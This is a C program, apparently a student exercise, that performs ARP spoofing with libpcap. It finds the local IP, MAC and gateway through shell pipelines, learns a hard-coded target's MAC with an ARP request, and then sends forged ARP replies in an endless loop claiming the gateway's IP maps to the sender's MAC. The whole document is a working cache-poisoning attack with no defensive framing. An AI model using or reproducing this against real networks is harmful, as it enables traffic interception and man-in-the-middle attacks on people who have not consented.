#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap/pcap.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/types.h> // needed for uint8_t, uint16_t
#include <linux/if_ether.h> // ETH_P_ARP = 0x0806
#include <netinet/ip.h>
#include <libnet.h>
#include <libnet-headers.h>


typedef struct _packet_hdr{

    // ethernet header
    uint8_t dst_addr[6];
    uint8_t src_addr[6];
    uint16_t etype;

    // arp header
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
} packet_hdr;

#define BUF_SIZE 42
#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2


char* get_ip();
char* get_mac();
char* get_gateway();

char buf1[BUF_SIZE];
char buf2[BUF_SIZE];
char buf3[BUF_SIZE];

int main(){

    char *dev;
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    packet_hdr pkthdr;
    u_char send_packet[42];


    uint8_t my_ip[4]={0};
    uint8_t my_mac[6]={0};
    uint8_t gt_ip[4]={0};
    uint8_t gt_mac[6]={0};
    uint8_t i=0;

    const u_char *packet;
    const u_char *packet2;
    struct pcap_pkthdr hdr;

    struct libnet_ethernet_hdr *eptr; // libnet-headers.h
    struct libnet_arp_hdr *aptr;
    struct libnet_arp_hdr arp_hdr;
    u_char *ptr;


    char *token = NULL;

    // get my_ip //
    token = strtok(get_ip(), ".");

    for(i=0; i<4; i++ )
    {
        my_ip[i] = atoi(token);
        token = strtok(NULL, ".");
        printf("%d ", my_ip[i]);
    }
    printf("\n");


    // get my_mac //
    token = strtok(get_mac(), ":");

    for(i=0; i<6; i++)
    {
        my_mac[i] = strtol(token, NULL,16);
        token = strtok(NULL, ":");
        printf("%x ", my_mac[i]);
    }


    // get gt_ip //
    printf("\n");
    token = strtok(get_gateway(), ".");

    for(i=0; i<4; i++)
    {
        gt_ip[i] = atoi(token);
        token = strtok( NULL, ".");
        printf("%d ", gt_ip[i]);
    }

    printf("\n======================================================\n\n");


    pkthdr.dst_addr[0] = 0xFF;
    pkthdr.dst_addr[1] = 0xFF;
    pkthdr.dst_addr[2] = 0xFF;
    pkthdr.dst_addr[3] = 0xFF;
    pkthdr.dst_addr[4] = 0xFF;
    pkthdr.dst_addr[5] = 0xFF;

    pkthdr.src_addr[0] = my_mac[0];
    pkthdr.src_addr[1] = my_mac[1];
    pkthdr.src_addr[2] = my_mac[2];
    pkthdr.src_addr[3] = my_mac[3];
    pkthdr.src_addr[4] = my_mac[4];
    pkthdr.src_addr[5] = my_mac[5];
    pkthdr.etype = htons(0x0806);

    pkthdr.htype = htons(0x0001);
    pkthdr.ptype = htons(0x0800);

    pkthdr.hlen = 0x06;
    pkthdr.plen = 0x04;
    pkthdr.opcode = htons(ARPOP_REQUEST);

    pkthdr.sender_mac[0] = my_mac[0];
    pkthdr.sender_mac[1] = my_mac[1];
    pkthdr.sender_mac[2] = my_mac[2];
    pkthdr.sender_mac[3] = my_mac[3];
    pkthdr.sender_mac[4] = my_mac[4];
    pkthdr.sender_mac[5] = my_mac[5];

    pkthdr.sender_ip[0] = my_ip[0];
    pkthdr.sender_ip[1] = my_ip[1];
    pkthdr.sender_ip[2] = my_ip[2];
    pkthdr.sender_ip[3] = my_ip[3];

    pkthdr.target_mac[0] = 0x00;
    pkthdr.target_mac[1] = 0x00;
    pkthdr.target_mac[2] = 0x00;
    pkthdr.target_mac[3] = 0x00;
    pkthdr.target_mac[4] = 0x00;
    pkthdr.target_mac[5] = 0x00;

    pkthdr.target_ip[0] = 192;
    pkthdr.target_ip[1] = 168;
    pkthdr.target_ip[2] = 63;
    pkthdr.target_ip[3] = 160;


    memcpy(send_packet, (u_char*)&pkthdr, sizeof(pkthdr));


    dev = pcap_lookupdev(errbuf);
    if(dev == NULL)
    {
        printf(""
               "%s\n", errbuf);
        exit(1);
    }
    printf("DEV: %s\n", dev);


    fp = pcap_open_live(dev, 100, 1, 1000, errbuf);

    if(fp == NULL){
        printf("pcap_open_live():%s\n", errbuf);
        return -1;
    }

    // send request message
    if(pcap_sendpacket(fp, send_packet, sizeof(send_packet)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
        return -1;
    }

    for(i=0; i<5; i++){

        packet = pcap_next(fp, &hdr);
        if (packet == NULL)
        {
            printf("\n\nDidn't grab packet\n\n");
            continue;
        }

        eptr = (struct libnet_ethernet_hdr *)packet;

        packet2 = packet + sizeof(struct libnet_ethernet_hdr);
        aptr = (struct libnet_arp_hdr *)packet2;


        if(ntohs(aptr->ar_op) == ARPOP_REPLY){
            if((eptr->ether_dhost[0] == (u_char)my_mac[0])&&(eptr->ether_dhost[1] == (u_char)my_mac[1])&&(eptr->ether_dhost[2] == (u_char)my_mac[2])&&(eptr->ether_dhost[3] == (u_char)my_mac[3])&&(eptr->ether_dhost[4] == (u_char)my_mac[4])&&(eptr->ether_dhost[5] == (u_char)my_mac[5])){

                pkthdr.dst_addr[0] = eptr->ether_shost[0];
                pkthdr.dst_addr[1] = eptr->ether_shost[1];
                pkthdr.dst_addr[2] = eptr->ether_shost[2];
                pkthdr.dst_addr[3] = eptr->ether_shost[3];
                pkthdr.dst_addr[4] = eptr->ether_shost[4];
                pkthdr.dst_addr[5] = eptr->ether_shost[5];

                pkthdr.target_mac[0] = eptr->ether_shost[0];
                pkthdr.target_mac[1] = eptr->ether_shost[1];
                pkthdr.target_mac[2] = eptr->ether_shost[2];
                pkthdr.target_mac[3] = eptr->ether_shost[3];
                pkthdr.target_mac[4] = eptr->ether_shost[4];
                pkthdr.target_mac[5] = eptr->ether_shost[5];

                printf("hi!!!!\n");
                break;
            }
            printf("arp_reply\n");
        }
        else{
            printf("2\n");
            continue;
        }

    }

    // send reply message
    while(1){
        pkthdr.sender_ip[0] = gt_ip[0];
        pkthdr.sender_ip[1] = gt_ip[1];
        pkthdr.sender_ip[2] = gt_ip[2];
        pkthdr.sender_ip[3] = gt_ip[3];
        pkthdr.opcode = htons(ARPOP_REPLY);

        memcpy(send_packet, (u_char*)&pkthdr, sizeof(pkthdr));

        if(pcap_sendpacket(fp, send_packet, sizeof(send_packet)) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
            return -1;
        }
    }

    pcap_close(fp);

    printf("\n");
    return 0;
}


char* get_ip(){
        FILE *p;

        p = popen("ifconfig | grep 'inet' | sed -n '1p' | tr -s ' ' | cut -d ' ' -f3 | cut -d ':' -f2", "r");
        if(p != NULL){
                while(fgets(buf1, BUF_SIZE, p));
                return buf1;
        }
        pclose(p);
}

char* get_mac(){
        FILE *p;

        p = popen("ifconfig | grep 'ens33' | tr -s ' ' | cut -d ' ' -f5", "r");
        if(p != NULL){
                while(fgets(buf2, BUF_SIZE, p));
            return buf2;
    }
        pclose(p);
}

char* get_gateway(){
    FILE *p;

    p = popen("route | grep default | tr -s ' ' | cut -d ' ' -f2", "r");
    if(p != NULL){
        while(fgets(buf3, BUF_SIZE, p));
            return buf3;
    }
    pclose(p);
}


